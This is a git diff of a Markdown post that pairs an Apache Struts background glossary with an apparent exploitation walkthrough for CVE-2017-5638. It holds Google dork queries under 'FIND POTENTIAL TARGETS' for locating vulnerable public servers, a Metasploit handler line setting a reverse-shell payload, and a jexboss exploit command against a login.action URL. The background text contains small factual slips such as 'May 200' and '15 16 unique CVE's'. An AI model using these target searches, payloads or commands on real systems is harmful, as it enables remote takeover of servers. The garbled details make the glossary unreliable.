@@ -6,6 +6,35 @@ author: 読み上げ
 comment: true
 ---
 
+## Apache Struts
+What is [Apache Struts](https://www.whitehatsec.com/glossary/content/apache-struts)?
+Apache Struts is an open-source web application framework used for creating Java EE web applications. It became a top-level Apache project in 2005. 
+Without Apache Struts, a standard Java EE web application receives information to a server through a web form submitted by a client or similar user. The information is then given to a Java Servlet or JavaServer Pages. In the Java Servlet, the information communicated interacts with a database and creates a response in HTML. Similarly, JavaServer Pages can be used to blend Java code and HTML for the same result. 
+Since these approaches mix presentation with application logic, they can make maintenance difficult for large projects. Apache struts is used to help amend that.
+Apache Struts helps fix the problems created with a standard Java EE web application by separating the model (the application logic that interacts with a database) from the view (HTML pages shown to the client) and from the controller (information that passes between the model and view). Struts provides the controller and promotes the writing of templates for the presentation layer or view. The programmer needs to write the model code and create a central configurate file that binds together model, view, and controller.
+
+## What is Apache Struts 1?
+Apache Struts 1 is the first iteration of Struts created in May 200 by Craig McClanahan and donated to the Apache Foundation. Its request-based framework consisted of 3 main components:
+ - ***A Request Handler***
+ - ***A Response Handler***
+ - ***A Tag Library***
+ 
+These worked to simplify the process of handling large projects and supported REST applications in addition to technologies such as SOAP & AJEX. However, due to limitations within Apache Struts 1 it was modified and updated in Struts 2.
+
+## What is Apache Struts 2?
+Apache Struts 2 was released in February 2007 and the rebranding of WebWork 2.2. Whilst the same architecture from Struts 1 was the same, the code base was completely different and unlike Struts 1 where requests went directly to the servlet, in Struts 2 requests & responses travel through an interceptor/filter.
+
+## Vulnerabilities within Apache Struts
+Struts has had numerous vulnerabilities disclosed, many based on its use of OGNL (Object-Graph Navigation Language). Many of these vulnerabilities have been particularly serious as they allow an attacker to carry out arbitrary remote code execution, potentially allowing complete control of the server. 
+The most high-profile Struts exploit happened in September 2017’s Equifax breach, which took advantage of a Struts vulnerability disclosed 6 months earlier. 
+Whilst some vulnerabilities were discovered within Struts 1 ( Denial of Service: [CVE-2006-1547](https://www.cvedetails.com/cve/CVE-2006-1547/), Cross Site Scripting: [CVE-2008-2025](https://www.cvedetails.com/cve/CVE-2008-2025/)), most vulnerabilities have been found on Struts 2 with many tied to the usage of OGNL technology.
+In 2016 there were 16 unique CVE’s released relating to Apache Struts 2 which like Struts 1 included, Denial of Service & Cross Site Scripting but further included Remote Code Execution and CSRF.
+In 2017 there were 15 16 unique CVE’s. It was in 2017 it was discovered that certain versions of the [Apache Struts 2](https://www.whitehatsec.com/blog/apache-struts-cve-2017/) Framework (Struts 2.3.5 – 2.3.31 and 2.5 – 2.5.10) were vulnerable to remote code execution attacks. This allowed attackers to deliver malicious payloads. To prevent these attacks, it was recommended to upgrade to Apache Struts version 2.3.32 or 2.5.10.1.
+You’ll gain a comprehensive understanding of the state of application security across the whole software development life cycle by reading through our [latest Stats Report](https://www.whitehatsec.com/resources-category/threat-reports/).
+
+## Apache Struts Vulnerability Testing 
+[WhiteHat’s DAST application scanning](https://www.whitehatsec.com/platform/dynamic-application-security-testing/) detects a large number of Struts vulnerabilities using production-safe tests. 
+
 # What is CVE-2017-5638?
 Struts is vulnerable to remote command injection attacks through incorrectly parsing an attacker’s invalid Content-Type HTTP header. The Struts vulnerability allows these commands to be executed under the privileges of the Web server. This is full remote command execution and has been actively exploited in the wild from the initial disclosure.
 
@@ -23,24 +52,24 @@ The curl command shown above demonstrates whether the server is vulnerable or no
 
 ## FIND POTENTIAL TARGETS
 
-intitle:"Struts problem report" intext:"Struts has detected an Unhandled"
-intitle:"Struts Problem Report" intext:"development mode is enabled."
-filetype:action
-filetype:do
-filetype:java
-filetype:out
-filetype:bat
-filetype:seam
-filetype:sh
-filetype:bson
-filetype:el
-filetype:pm
-inurl:login.action
-inurl:login.do
-inurl:login.java
-inurl:index.action
-inurl:index.do
-inurl:index.java
+~ intitle:"Struts problem report" intext:"Struts has detected an Unhandled"
+~ intitle:"Struts Problem Report" intext:"development mode is enabled."
+~ filetype:action
+~ filetype:do
+~ filetype:java
+~ filetype:out
+~ filetype:bat
+~ filetype:seam
+~ filetype:sh
+~ filetype:bson
+~ filetype:el
+~ filetype:pm
+~ inurl:login.action
+~ inurl:login.do
+~ inurl:login.java
+~ inurl:index.action
+~ inurl:index.do
+~ inurl:index.java
 
 ## DEPENDENCIES
 
@@ -97,5 +126,7 @@ $ msf exploit(multi/handler) > set PAYLOAD linux/x86/shell/reverse_tcp PAYLOAD =
 ~~~bash
 $ sudo python jexboss.py -u http://example.com/login.action
 ~~~
-
-Complete Guide:[here](https://youtu.be/Bt9m__yel8M)
+<details>
+<summary>Complete Guide</summary>
+[netsparker](https://www.netsparker.com/blog/web-security/finding-exploiting-apache-struts-vulnerabilities/)
+[Related Articles](https://github.com/search?q=apachestruts&type=all)
